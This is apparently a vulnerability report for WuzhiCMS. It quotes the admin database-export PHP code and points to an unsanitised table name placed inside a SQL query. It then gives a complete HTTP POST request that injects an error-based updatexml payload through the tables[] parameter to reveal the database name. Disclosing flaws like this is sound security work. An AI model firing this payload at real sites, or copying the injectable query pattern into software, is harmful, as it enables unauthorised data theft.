Vulnerability file：`coreframe/app/database/admin/index.php`
```php
private function export_database($tables,$sqlcompat,$sqlcharset,$sizelimit,$fileid,$random,$tableid,$startfrom) {
		$dumpcharset = $sqlcharset ? $sqlcharset : str_replace('-', '', CHARSET);
		$fileid = ($fileid != '') ? $fileid : 1;
		if($fileid==1 && $tables) {
			if(!isset($tables) || !is_array($tables)) {
				MSG("请选择数据表");
			}
			set_cache('database', $tables,'database');
			$random = random(8);
		} else {
			$tables = get_cache('database','database');
			if($tables == 1) {	
				MSG("请选择数据表");
			}
		}
		$tabledump = '';
		$tableid = ($tableid!= '') ? $tableid - 1 : 0;
		$startfrom = ($startfrom != '') ? intval($startfrom) : 0;
		for($i = $tableid; $i < count($tables) && strlen($tabledump) < $sizelimit * 1000; $i++) {
			global $startrow;
			$offset = 100;
			if(!$startfrom) {
				$tabledump .= "DROP TABLE IF EXISTS `$tables[$i]`;\n";
				$createtable = $this->db->query("SHOW CREATE TABLE `$tables[$i]` ");
				$create = $this->db->fetch_array($createtable);
				$tabledump .= $create['Create Table'].";\n\n";
				$this->db->free_result($createtable);
				if($this->db->version() > '4.1' && $sqlcharset) {
					$tabledump = preg_replace("/(DEFAULT)*\s*CHARSET=[a-zA-Z0-9]+/", "DEFAULT CHARSET=".$sqlcharset, $tabledump);
				}
			}
			$numrows = $offset;
			while(strlen($tabledump) < $sizelimit * 1000 && $numrows == $offset) {
				$sql = "SELECT * FROM `$tables[$i]` LIMIT $startfrom, $offset";
				$query = $this->db->query($sql);
				$numfields = $this->db->num_fields($query);
				$numrows = $this->db->num_rows($query);
				$fields_name = $this->get_fields($tables[$i]);
				$rows = $this->db->query($sql);
				$name = array_keys($fields_name);
				$r = array();
				while ($row = $this->db->fetch_array($query)) {
					$r[] = $row;
					$comma = "";
					$tabledump .= "INSERT INTO `$tables[$i]` VALUES(";
					for($j = 0; $j < $numfields; $j++) {
						$tabledump .= $comma."'".str_replace("\n","\\n", addslashes($row[$name[$j]]))."'";
						$comma = ",";
					}
					$tabledump .= ");\n";
				}
				$this->db->free_result($rows);
				$startfrom += $offset;
			}
			$tabledump .= "\n";
			$startrow = $startfrom;
			$startfrom = 0;
		}
		if(trim($tabledump)) {

			$tabledump = "# wuzhicms bakfile\n# version:wuzhicms\n# time:".date('Y-m-d H:i:s')."\n# type:wuzhicms\n# wuzhicms:http://www.wuzhicms.com\n# --------------------------------------------------------\n\n\n".$tabledump;
			$tableid = $i;
			$filename = $random.'_'.date('Ymd').'_'.$fileid.'.sql';
			$altid = $fileid;
			$fileid++;
			$bakfile_path = CACHE_ROOT.'db_bak/'.CACHE_EXT.'/';
            if(!file_exists($bakfile_path)) {
                mkdir($bakfile_path,0777,true);
            }
			$bakfile = $bakfile_path.$filename;
			file_put_contents($bakfile, $tabledump);
			//@chmod($bakfile, 0777);
			MSG("备份文件".$filename."成功",'?m=database&f=index&v=export&sizelimit='.$sizelimit.'&sqlcompat='.$sqlcompat.'&sqlcharset='.$sqlcharset.'&tableid='.$tableid.'&fileid='.$fileid.'&startfrom='.$startrow.'&random='.$random.'&dosubmit=1'.$this->su());
		} else {
			$bakfile_path = CACHE_ROOT.'db_bak/'.CACHE_EXT.'/';

			file_put_contents($bakfile_path.'index.html',' ');
			set_cache('database','','database');
			MSG("备份成功","?m=database&f=index&v=export".$this->su());
		}
	} 
```
Vulnerability trigger code：
```php
        $sql = "SELECT * FROM `$tables[$i]` LIMIT $startfrom, $offset";
				$query = $this->db->query($sql);
```
Payload：
```
POST /index.php?m=database&f=index&v=export&_su=wuzhicms&_menuid=35 HTTP/1.1
Host: www.wuzhi.com:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 180
Cookie: SAO_truename=test1; SAO_search_cookie=S0EuLkW7bHag%2B1bjp6VfQMtQNQIvELzBon1mVszhRHiDCpb1KVMxJnoAQAo2aqTIGZLGLujw%2BLx9C2ISfGWSC63mm2C3aPeXDsn25dPTFhDGlUWStvWS1A%3D%3D; PHPSESSID=a116us3mm6898rha6dn4f0nv93; SAO_siteid=Z2CDraXeO8oKCYp%2BCbfiKA%3D%3D; SAO_userkeys=MJLNEr1WYi4ZrSn2ZsBSjA%3D%3D; SAO_uid=Y77K%2B1fVbunDsnqJBTg95A%3D%3D; SAO_username=PFhQrEXEKbnqDJujPufnqg%3D%3D; SAO_wz_name=uOQJaZvUcquiw4Hy8k4Chg%3D%3D
Upgrade-Insecure-Requests: 1

sizelimit=2048&sqlcompat=&sqlcharset=&dosubmit=1&tables%5B%5D=wz_admin`+where+uid=1+and+updatexml('anything',concat('~',(SELECT+DATABASE())),'anything')#&tables%5B%5D=1&startfrom=1
```

Verify：

![image-20231020090647266](https://github.com/XTo-o1/PHP/blob/main/wuzhicms/images/image-20231020090647266.png)
